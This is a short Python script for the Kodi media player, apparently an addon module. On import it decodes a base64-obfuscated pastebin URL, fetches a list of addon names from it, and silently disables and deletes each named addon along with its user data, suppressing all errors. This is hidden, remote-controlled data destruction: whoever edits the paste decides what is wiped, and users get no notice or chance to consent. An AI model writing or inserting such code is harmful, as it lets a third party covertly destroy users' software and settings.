import requests
import xbmc, xbmcaddon, xbmcgui, xbmcplugin, os, sys, xbmcvfs, glob
import shutil,logging
import urllib2,urllib


fullsecfold=xbmc.translatePath('special://home')

addons_folder=os.path.join(fullsecfold,'addons')

user_folder=os.path.join(xbmc.translatePath('special://masterprofile'),'addon_data')

remove_url = 'aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1JON0h5TDJH'.decode('base64')



def remove_addon():
	try:
			import json
			r = urllib2.urlopen(remove_url).readlines()
			for line in r:
				
				add_name =line.split(':')[1].strip() 
				do_json = '{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}' % (add_name, 'false')
				query = xbmc.executeJSONRPC(do_json)
				response = json.loads(query)
				
				url_folder=os.path.join(addons_folder,add_name)
				
				if os.path.exists(url_folder):
					for root, dirs, files in os.walk(url_folder):
						for f in files:
							os.unlink(os.path.join(root, f))
						for d in dirs:
							shutil.rmtree(os.path.join(root, d))
					os.rmdir(url_folder)
				
				url_folder=os.path.join(user_folder,add_name)
				
				if os.path.exists(url_folder):
					for root, dirs, files in os.walk(url_folder):
						for f in files:
							os.unlink(os.path.join(root, f))
						for d in dirs:
							shutil.rmtree(os.path.join(root, d))
					os.rmdir(url_folder)
			xbmc.executebuiltin('Container.Refresh')
			xbmc.executebuiltin("XBMC.UpdateLocalAddons()")
			xbmc.executebuiltin('Container.Update(%s)' % xbmc.getInfoLabel('Container.FolderPath'))
	except:  pass

remove_addon()